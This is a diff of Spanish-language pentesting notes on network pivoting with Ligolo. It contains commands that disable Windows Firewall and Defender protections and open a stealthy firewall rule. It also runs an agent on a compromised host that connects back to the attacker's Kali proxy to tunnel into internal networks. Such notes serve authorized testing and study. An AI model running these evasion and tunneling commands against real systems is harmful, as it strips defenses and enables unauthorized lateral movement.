@@ -1,6 +1,6 @@
 # Pivoting 
 
-Tags: #Pivoting #Ligolo 
+Tags: #Pivoting #Ligolo #Windows #Linux 
 
 El **pivoting** (también conocido como “hopping”) es una técnica utilizada en pruebas de penetración y en el análisis de redes que implica el uso de una máquina comprometida para atacar otras máquinas o redes en el mismo entorno.
 
@@ -16,7 +16,8 @@ El pivoting puede ser utilizado para superar restricciones de seguridad que de o
 # Verificar estado actual antes de tocar nada
 ❯ netsh advfirewall show allprofiles state
 
-# Deshabilitar Windows Firewall (requiere High integrity / SYSTEM)
+Paso 1: (requiere High integrity / SYSTEM)
+# Deshabilitar Windows Firewall 
 ❯ netsh advfirewall set allprofiles state off
 
 # Deshabilita los 3 perfiles: Domain, Private y Public
@@ -26,18 +27,17 @@ El pivoting puede ser utilizado para superar restricciones de seguridad que de o
 # Alternativa — solo abrir el puerto específico sin deshabilitar todo (más sigiloso)
 ❯ netsh advfirewall firewall add rule name="Ligolo" dir=out action=allow protocol=TCP localport=<PORT>
 
+Paso 2: (requiere High integrity / SYSTEM)
 ❯ Set-MpPreference -DisableRealtimeMonitoring $true 
 ❯ Set-MpPreference -DisableScriptScanning $true 
 ❯ Set-MpPreference -DisableIOAVProtection $true
 
+Paso 3:
 # Comprobaar el estado de Windows Defender 
 ❯ Get-MpComputerStatus | select RealTimeProtectionEnabled, AMSIEnabled
 
 ❯ sc query windefend
 # Estado de Windows Defender
-
-# PowerShell → deshabilitar Defender
-❯ Set-MpPreference -DisableRealtimeMonitoring $true
 
 ❯ wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName
 # Ver antivirus instalado
@@ -68,7 +68,30 @@ del proceso:
 ![[ligolo_punto_a_punto_b.png]]
 
 
-### Conectar Kali al Punto B por medio del Punto A  con un agente
+## 1: Conectar Kali al Punto A
+
+```bash 
+PASO 1: 
+❯ ./proxy -selfcert -laddr 0.0.0.0:11601      # Ejecutar el proxy en Kali con permisos de ejecución
+	❯ interface_create --name ligolo          # Crear la interfaz
+	❯ interface_add_route --name ligolo --route IP.0/24    
+	# Agregar el segmento al cual se quiere llegar 
+
+PASO 2: 
+❯ chmod +x agent   # Permisos de ejecución 
+❯ ./agent -connect IP_Kali:11601 -ignore-cert       
+# Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
+	# IP = Direción IP de Kali
+	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 
+
+
+PASO 3:
+# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactiva de ligolo
+❯ session         # Mostrar las sesiones activas, seleccionar la sesión 1 y dar 'Enter'
+❯ tunnel_start --tun ligolo   # Iniciar el tunelizado al segmento de red  
+```
+
+### 2: Conectar Kali al Punto B por medio del Punto A  con un agente
 
 ```bash 
 # Descargar agente y proxy 
@@ -76,19 +99,21 @@ NOTA: Cada vez que se quiera llegar a una red, se tiene que crear una nueva inte
 
 PASO 1: 
 ❯ ./proxy -selfcert -laddr 0.0.0.0:11601      # Ejecutar el proxy en Kali con permisos de ejecución
-❯ interface_create --name ligolo              # Crear la interfaz
-❯ interface_add_route --name ligolo --route IP.0/24     # Agregar el segmento al cual se quiere llegar 
+	❯ interface_create --name ligolo          # Crear la interfaz
+	❯ interface_add_route --name ligolo --route IP.0/24     
+	# Agregar el segmento al cual se quiere llegar 
 
 
 PASO 2: 
 ❯ chmod +x agent   # Permisos de ejecución 
-❯ ./agent -connect IP_Kali:11601 -ignore-cert       # Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
+❯ ./agent -connect IP_Kali:11601 -ignore-cert       
+# Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
 	# IP = Direción IP de Kali
 	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 
 
 
 PASO 3:
-# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactivade ligolo
+# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactiva de ligolo
 ❯ session         # Mostrar las sesiones activas, seleccionar la sesión 1 y dar 'Enter'
 ❯ tunnel_start --tun ligolo   # Iniciar el tunelizado al segmento de red     
 ```
@@ -121,7 +146,7 @@ PASO 2:
 ❯ ip route list                      # Mirar la tabla de enrutamiento 
 ```
 
-### Conectar Kali al Punto Final por medio del Punto B con un agente
+### 3: Conectar Kali al Punto Final por medio del Punto B con un agente
 
 ```bash 
 # Esto funciona cuando ya se tiene un primer túnel (Punto A) y se quiere crear un segundo túnel 
